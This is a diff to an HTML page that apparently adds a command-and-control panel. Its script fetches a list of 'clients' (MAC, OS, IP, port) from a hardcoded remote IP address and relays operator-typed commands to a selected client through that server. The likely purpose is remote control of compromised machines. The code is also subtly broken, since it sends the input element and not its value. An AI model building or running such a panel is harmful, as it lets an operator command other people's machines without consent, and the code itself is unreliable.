@@ -2,9 +2,62 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Title</title>
+    <title>Control</title>
+    <script>
+        JSON.safeParse = function (str) {
+            try {
+                return this.parse(str);
+            } catch (e) {
+                return false;
+            }
+        };
+        function query(data, callback) {
+            let url = "http://3.89.196.174:6702/?";
+            let arr = [];
+            for (let prop in data) {
+                if (data.hasOwnProperty(prop)) {
+                    arr.push(encodeURI(prop) + "=" + encodeURI(data[prop]));
+                }
+            }
+            url += arr.join("&");
+            let xhr = new XMLHttpRequest();
+            xhr.open("GET", url);
+            xhr.onreadystatechange = function () {
+                if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                    if (typeof callback === "function") callback(xhr.responseText);
+                }
+            };
+            xhr.onerror = e => console.log(e);
+            xhr.send();
+        }
+
+        window.onload = function() {
+            query({"clients": "kar"}, data => {
+                let arr = JSON.safeParse(data);
+                if (arr) {
+                    for (let client of arr) {
+                        let option = document.createElement("option");
+                        option.value = client.mac;
+                        option.innerText = client.mac + " " + client.os + " (" + client.ip + ":" + client.port + ")";
+                        document.querySelector("#client").appendChild(option);
+                    }
+                }
+            });
+            document.querySelector("#send").onclick = function() {
+                let e = document.querySelector("#client");
+                let mac = e.options[e.selectedIndex].value;
+                let command = document.querySelector("#command");
+                query({
+                    mac: mac,
+                    command: command,
+                });
+            };
+        }
+    </script>
 </head>
 <body>
-
+<label for="client">Select client: </label><select id="client"></select><br>
+<label for="command">Command: </label><input type="text" id="command"><br>
+<button id="send">Send</button>
 </body>
 </html>
